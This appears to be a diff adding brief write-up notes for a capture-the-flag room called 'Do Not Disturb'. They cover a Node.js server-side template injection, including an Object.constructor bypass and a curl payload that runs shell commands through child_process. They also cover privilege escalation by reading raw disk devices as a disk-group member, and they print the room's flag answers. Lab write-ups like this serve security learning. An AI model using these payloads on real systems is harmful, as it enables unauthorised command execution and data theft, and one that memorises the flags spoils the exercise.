@@ -1,0 +1,24 @@
+📝 Do Not Disturb - Room Notes
+1. Initial Access (SSTI)
+Vulnerability: Server-Side Template Injection (SSTI) in a Node.js application (likely EJS or Pug engine).
+Bypass Technique: Direct access to process or require was blocked. The successful bypass utilized the Object.constructor to access the function constructor and execute arbitrary code.
+Payload Logic: <% var x = Object.constructor; %><%- x("return process")().mainModule.require("child_process")... %>
+User Flag: THM{w4rm_s3ss10n_h1j4ck3d}
+Retrieval Method: Executed via curl POST request to /staff/preview using the SSTI payload to run find and cat commands. 
+2. Privilege Escalation
+Vector: Disk Group Misconfiguration. 
+Mechanism: The compromised user is a member of the disk group. This group has read/write permissions on raw block devices (e.g., /dev/sda1), bypassing standard file system permissions.
+Note: In your specific execution, you accessed a raw device (referenced as /dev/memnon1 in your output) to read the flag directly.
+Root Flag: THM{r4w_d1sk_4c3ss_w4s_t00_much}
+Retrieval Method: Reading the raw disk device or mounting the partition to access /root/root.txt without needing a root shell. 
+3. Key Commands Used
+SSTI Execution:
+curl -s -X POST [URL]/staff/preview -b "$COOKIE" --data-urlencode 'template=<%- global.process.mainModule.require("child_process").execSync("cat /root/root.txt").toString() %>'
+
+Disk Access (Conceptual):
+# Mounting method
+sudo mount /dev/sda1 /mnt
+cat /mnt/root/root.txt
+
+# Or direct raw read (as seen in your output)
+strings /dev/memnon1 | grep THM
